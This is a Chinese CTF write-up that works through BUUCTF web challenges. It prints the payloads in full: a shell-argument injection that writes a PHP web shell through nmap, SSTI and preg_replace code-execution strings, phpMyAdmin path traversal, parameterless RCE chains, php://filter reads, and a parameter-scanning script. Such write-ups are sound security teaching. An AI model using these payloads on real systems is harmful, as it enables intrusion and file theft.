---
title: BUUCTF(二)
categories: ctf题目
---

# 前言
BUUCTF web 第二页 上半部分前16题

---
# [BUUCTF 2018]Online Tool
这里也是网鼎杯nmap

<!--more-->

```php
<?php

if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    $host = escapeshellcmd($host);
    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox '.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);  //切换目录路径
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
}
```
这里引出 `escapeshellarg +escapeshellcmd` 函数漏洞

[谈谈escapeshellarg参数绕过和注入的问题](http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/#1-CVE-2016-10033)

传入参数是:
```
172.17.0.2' -v -d a=1
```
首先经过 `escapeshellarg` 处理后变成了
```
'172.17.0.2'\'' -v -d a=1'
```
即 `先对单引号转义`，再用`单引号将左右两部分括起来`从而起到连接的作用。

再经过 `escapeshellcmd` 处理后变成
```
'172.17.0.2'\\'' -v -d a=1\'
```
这是因为 escapeshellcmd 对 `\` 以及最后那个`不配对儿的引号`进行了`转义`

最后执行的命令是
```
curl '172.17.0.2'\\'' -v -da=1\'
```
由于中间的 `\\ 被解释为 \` 而不再是转义字符，所以后面的 `'` 没有被转义，与再`后面的 '` 配对儿成了一个空白连接符。

所以可以简化为
```
curl 172.17.0.2\ -v -d a=1'
```
即向`172.17.0.2\`发起请求，POST 数据为`a=1'`

Payload:
```
输入：' <?php phpinfo();?> -oG hack.php '

Escapeshellarg之后：''\'' <?php phpinfo();?> -oG hack.php '\'''
Escapeshellcmd之后：''\\'' \<\?php phpinfo\(\)\;\?\> -oG hack.php '\\'''

这里就相当于：\ <?php phpinfo();?> -oG hack.php \\

Getflag：' <?php echo `cat /flag`;?> -oG test.php '
```

使用一句话时注：
```
当参数使用 单引号 时如这样：' <?php eval($_POST['v']);?> -oG shell.php '
escapeshellrg之后：''\'' <?php eval($_POST['\''v'\'']);?> -oG shell.php '\'''
cmd之后：''\\'' \<\?php eval\(\$_POST\['\\''v'\\''\]\)\;\?\> -oG shell.php '\\'''
相当于：\ <?php eval($_POST[\\'v'\]);?> -oG shell.php \\
```

---
# [强网杯 2019]高明的黑客
按照提示下载备份源码
好家伙3002个

![](https://img-blog.csdnimg.cn/20210426110908989.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
思路：文件里面有eval之类的函数，打开文件，找到参数，去网站`一个一个文件匹配`，可以在自己本地搭建php，先跑一下

脚本：
```python
import os
import requests
import re
import threading
import time
print('开始时间：  '+  time.asctime( time.localtime(time.time()) ))
s1=threading.Semaphore(100)                               #这儿设置最大的线程数
filePath = r"C:/Users/cys/Desktop/src/"
os.chdir(filePath)                                     #改变当前的路径
requests.adapters.DEFAULT_RETRIES = 5                       #设置重连次数，防止线程数过高，断开连接
files = os.listdir(filePath)
session = requests.Session()
session.keep_alive = False                                # 设置连接活跃状态为False
def get_content(file):
    s1.acquire()
    print('trying   '+file+ '     '+ time.asctime( time.localtime(time.time()) ))
    with open(file,encoding='utf-8') as f:                   #打开php文件，提取所有的$_GET和$_POST的参数
            gets = list(re.findall('\$_GET\[\'(.*?)\'\]', f.read()))
            posts = list(re.findall('\$_POST\[\'(.*?)\'\]', f.read()))
    data = {}                                         #所有的$_POST
    params = {}                                           #所有的$_GET
    for m in gets:
        params[m] = "echo 'xxxxxx';"
    for n in posts:
        data[n] = "echo 'xxxxxx';"
    url = 'http://127.0.0.1/src/'+file
    req = session.post(url, data=data, params=params)        #一次性请求所有的GET和POST
    req.close()                                     # 关闭请求  释放内存
    req.encoding = 'utf-8'
    content = req.text
    #print(content)
    if "xxxxxx" in content:                            #如果发现有可以利用的参数，继续筛选出具体的参数
        flag = 0
        for a in gets:
            req = session.get(url+'?%s='%a+"echo 'xxxxxx';")
            content = req.text
            req.close()                                     # 关闭请求  释放内存
            if "xxxxxx" in content:
                flag = 1
                break
        if flag != 1:
            for b in posts:
                req = session.post(url, data={b:"echo 'xxxxxx';"})
                content = req.text
                req.close()                                     # 关闭请求  释放内存
                if "xxxxxx" in content:
                    break
        if flag == 1:                                      #flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，
            param = a
        else:
            param = b
        print('找到了利用文件： '+file+"  and 找到了利用的参数：%s" %param)
        print('结束时间：  ' + time.asctime(time.localtime(time.time())))
    s1.release()

for i in files:                                              #加入多线程
   t = threading.Thread(target=get_content, args=(i,))
   t.start()
```

---
# *[RoarCTF 2019]Easy Java

![](https://img-blog.csdnimg.cn/20210426111025268.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)点help发现：`java.io.FileNotFoundException:{help.docx}`

报错信息：

![](https://img-blog.csdnimg.cn/20210426111054132.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
搜到（CVE-2018-1305）没用

Wp：

>通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致 `web.xml 等文件能够被读取`。漏洞检测以及利用方法：`通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码`

WEB-INF/web.xml泄露

>WEB-INF 是 Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，`必须通过web.xml文件对要访问的文件进行相应映射才能访问`。

`WEB-INF`主要包含一下文件或目录：

- /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。

- /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中
- /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件
- /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。
- /WEB-INF/database.properties：数据库配置文件


抓包，发现是get请求

**这里要修改post方式**

**修改为post请求WEB-INF/web.xml**

![](https://img-blog.csdnimg.cn/20210426111514295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

当直接访问/Flag时报错：

![](https://img-blog.csdnimg.cn/20210426111532613.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
看到 flagcontroller，尝试下载

![](https://img-blog.csdnimg.cn/20210426111617955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
打开后发现base64，解码得flag


---
# [GXYCTF2019]BabyUpload
.htaccess 与 show_source函数

---
# ***[GXYCTF2019]禁止套娃
- 考点：无参RCE

[无参RCE](https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/)

开局一片空

![](https://img-blog.csdnimg.cn/20210426111827803.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
Git泄露

![](https://img-blog.csdnimg.cn/20210426111838497.png#pic_center)
得到index.php源码
```php
<?php
include "flag.php";
echo "flag在哪里呢？<br>";
if(isset($_GET['exp'])){
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                // echo $_GET['exp'];
                @eval($_GET['exp']);
            }
            else{
                die("还差一点哦！");
            }
        }
        else{
            die("再好好想想！");
        }
    }
    else{
        die("还想读flag，臭弟弟！");
    }
}
// highlight_file(__FILE__);
?>
```

考点：
```
 '/[a-z,_]+\((?R)?\)/' 这个正则主要的难点就是(?R)，这是PHP的递归模式：
```
就是这能 `a(b(c(d())))` 这样，()里不能有参数

所以叫做无参RCE

payload：

尝试一：session_id直接读文件

>因为session未开启，所以先开启session，再获取会话ID，在session ID处进行构造：

![](https://img-blog.csdnimg.cn/20210426112030785.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
```
?exp=show_source(session_id(session_start()));
PHPSESSID=flag.php
```


尝试二：getallheaders()
>由于第三个if 过滤了et，所以这个方法不行

如果可以：
```
var_dump(end(getallheaders()));
bp里面构造headers
```

尝试三：get_defined_vars()
这题不行

如果可以：
```
? num=eval(end(current(get_defined_vars())));&b=show_source('/f1agg');
```

尝试四：localeconv()
```
?exp=print_r(scandir(pos(localeconv())));  //注：pos()是current()别名，返回数组中当前元素的值
```

![](https://img-blog.csdnimg.cn/20210426112353829.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
最终：
```
?exp=readfile(next(array_reverse(scandir(pos(localeconv())))));
```

---
# [BJDCTF2020]The mystery of ip

![](https://img-blog.csdnimg.cn/20210426112443483.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
直接显示我的ip：抓包看到没有XFF，我就添加一个，结果回显:

![](https://img-blog.csdnimg.cn/20210426112458427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
测试出来是ssti：

![](https://img-blog.csdnimg.cn/20210426112514591.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
Smarty模板：

![](https://img-blog.csdnimg.cn/20210426112526864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
使用if标签：

![](https://img-blog.csdnimg.cn/20210426112540957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
payload:
```
{if system('cat /flag')}{/if}
```

漏洞处：
```
$smarty->display("string:".$ip)      // display函数把标签替换成对象的php变量；显示模板，无过滤
```

---
# [GWCTF 2019]我有一个数据库
开门就是语文考试零级

![](https://img-blog.csdnimg.cn/20210426112650217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
抓包：

![](https://img-blog.csdnimg.cn/20210426112702159.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

Robots.xtt发现phpinfo()

想着题目是数据库直接phpmyadmin

![](https://img-blog.csdnimg.cn/20210426112717958.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

找到`phpmyadmin 4.8.1` (CVE-2018-12613)
```
phpmyadmin/index.php?target=db_sql.php?/../../../../../../../../etc/passwd
```

![](https://img-blog.csdnimg.cn/20210426112748320.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
直接读取：
```
/phpmyadmin/index.php?target=db_sql.php?/../../../../../../../flag
```

---
# **[BJDCTF2020]ZJCTF，不过如此
- 考点：preg_replace /e漏洞

[深入研究preg_replace与代码执行](https://xz.aliyun.com/t/2557)

```php
<?php

error_reporting(0);
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }

    include($file);  //next.php
    
}
else{
    highlight_file(__FILE__);
}
?>
```

两个参数用php伪协议绕过
next.php:
```php
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace('/(' . $re . ')/ei','strtolower("\\1")',$str);
}


foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
	@eval($_GET['cmd']);
}
```

看到了`preg_replace /e`
Payload:
```
?\S*=${getFlag()}&cmd=system('cat /flag');
```

---
# [BJDCTF2020]Mark loves cat
- 考点：变量覆盖

看起来是个xss：

![](https://img-blog.csdnimg.cn/20210426113249180.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
不是xss

/.git/泄露，下载文件后审计
```php
<?php

include 'flag.php';

$yds = "dog";
$is = "cat";
$handsome = 'yds';

foreach($_POST as $x => $y){
    $$x = $y;
}

foreach($_GET as $x => $y){
    $$x = $$y;
}

foreach($_GET as $x => $y){
    if($_GET['flag'] === $x && $x !== 'flag'){
        exit($handsome);
    }
}

if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($yds);
}

if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
    exit($is);
}
echo "the flag is: ".$flag;
```

解法：三种都可以解出来

![](https://img-blog.csdnimg.cn/2021042611334345.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
直接get传参数即可 ?yds=flag

![](https://img-blog.csdnimg.cn/20210426113358904.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
或者：?is=flag&flag=flag

![](https://img-blog.csdnimg.cn/20210426113430723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

或者：

![](https://img-blog.csdnimg.cn/2021042611345442.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
# *[安洵杯 2019]easy_web
- 考点：MD5碰撞

进入网址：

![](https://img-blog.csdnimg.cn/20210426113604507.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

解两次base64解码得：3535352e706e67 `hex解码`得：55.png

删除后：

![](https://img-blog.csdnimg.cn/20210426113617284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

输入cmd只有两种情况
>forbid ~
md5 is funny ~


既然这样能得到 55.png我们试着反向加密index.php

得到index.php:
```php
<?php
error_reporting(E_ALL || ~ E_NOTICE);
header('content-type:text/html;charset=utf-8');
$cmd = $_GET['cmd'];
if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');
$file = hex2bin(base64_decode(base64_decode($_GET['img'])));

$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
if (preg_match("/flag/i", $file)) {
    echo '<img src ="./ctf3.jpeg">';
    die("xixi～ no flag");
} else {
    $txt = base64_encode(file_get_contents($file));
    echo "<img src='data:image/gif;base64," . $txt . "'></img>";
    echo "<br>";
}
echo $cmd;
echo "<br>";
if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
    echo("forbid ~");
    echo "<br>";
} else {
    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
        echo `$cmd`;
    } else {
        echo ("md5 is funny ~");
    }
}

?>
```

字符串不同但是MD5值相同

用到MD5碰撞

![](https://img-blog.csdnimg.cn/20210426113820656.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
```
a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2

b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```

```
param1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2

param2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
```

ls ban了用 `dir`命令

![](https://img-blog.csdnimg.cn/20210426113943168.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
```
cmd=c\at%20/flag
```

---
# [网鼎杯 2020 朱雀组]phpweb

抓包：

![](https://img-blog.csdnimg.cn/20210426114034604.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
func是方法，p是参数

直接读一手文件：

func=readfile&p=index.php

index.php:
```php
<?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
    function gettime($func, $p) {
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];

    if ($func != null) {
        $func = strtolower($func);
        if (!in_array($func,$disable_fun)) {
            echo gettime($func, $p);
        }else {
            die("Hacker...");
        }
    }
?>
```

既然是`数组比对`，那构造：
```
func=\system&p=ls
```

或者反序列化
```
<?php
 class Test {
        var $p = "ls /";
        var $func = "system";
}
echo serialize(new Test());
  
?>
```

---
# (x)[De1CTF 2019]SSRF Me

---
# [NCTF2019]Fake XML cookbook

网页源码读取：
```
function doLogin(){
	var username = $("#username").val();
	var password = $("#password").val();
	if(username == "" || password == ""){
		alert("Please enter the username and password!");
		return;
	}
	
	var data = "<user><username>" + username + "</username><password>" + password + "</password></user>"; 
    $.ajax({
        type: "POST",
        url: "doLogin.php",
        contentType: "application/xml;charset=utf-8",
        data: data,
        dataType: "xml",
        anysc: false,
        success: function (result) {
        	var code = result.getElementsByTagName("code")[0].childNodes[0].nodeValue;
        	var msg = result.getElementsByTagName("msg")[0].childNodes[0].nodeValue;
        	if(code == "0"){
        		$(".msg").text(msg + " login fail!");
        	}else if(code == "1"){
        		$(".msg").text(msg + " login success!");
        	}else{
        		$(".msg").text("error:" + msg);
        	}
        },
        error: function (XMLHttpRequest,textStatus,errorThrown) {
            $(".msg").text(errorThrown + ':' + textStatus);
        }
    }); 
}
```

用户名处回显：

![](https://img-blog.csdnimg.cn/20210426114343947.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
构造xxe

![](https://img-blog.csdnimg.cn/20210426114359420.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
# **[ASIS 2019]Unicorn shop
- 考点：Unicode字符

进入：

![](https://img-blog.csdnimg.cn/20210426114440709.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
只输入 id，报错：

![](https://img-blog.csdnimg.cn/20210426114451518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
抓包：

![](https://img-blog.csdnimg.cn/20210426114502496.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
提示utf-8很重要

![](https://img-blog.csdnimg.cn/2021042611451349.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
在price处提示只能输入一个字符：

![](https://img-blog.csdnimg.cn/20210426114523178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
也就是说要输入一个字符，它自身代表的值就是一个很大的数字

https://www.compart.com/en/unicode/

接着我们在这个网站搜索大于 `thousand` 的单个字符，就可以购买第四只独角兽了

![](https://img-blog.csdnimg.cn/2021042611454531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
![](https://img-blog.csdnimg.cn/20210426114612483.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
![](https://img-blog.csdnimg.cn/20210426114620371.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
将其url编码直接输入即可：

![](https://img-blog.csdnimg.cn/20210426114633886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
# [BJDCTF2020]Cookie is so stable
登录抓包后发现是ssti：

![](https://img-blog.csdnimg.cn/20210426114704680.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

测试出来是twig
Payload：
```
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("cat /flag")}}
```
Twig payload：

[SSTI（模板注入）漏洞（入门篇）](https://www.cnblogs.com/bmjoker/p/13508538.html)

---
# *[BSidesCF 2020]Had a bad day
这才是猛男该看的：

![](https://img-blog.csdnimg.cn/20210426114824636.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

注意到url 可能存在包含直接包含index.php:

![](https://img-blog.csdnimg.cn/20210426114925444.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
需要woofers或者meowers

再试试：=woofers;index.php

出现报错：


>Warning: include(/var/www/html/index.php.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 37

>Warning: include(): Failed opening '/var/www/html/index.php.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 37

知道自动在后面添加.php

直接伪协议读取：
```
php://filter/read=convert.base64-encode/resource=index
```

index.php:

```php
<?php
	$file = $_GET['category'];

    if(isset($file))
{
	if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
	include ($file . '.php');
}
else{
	echo "Sorry, we currently only support woofers and meowers.";
	}
}	
?>
```
可以这样写：php://filter伪协议可以套一层协议
```
php://filter/read=convert.base64-encode/woofers/resource=flag
```
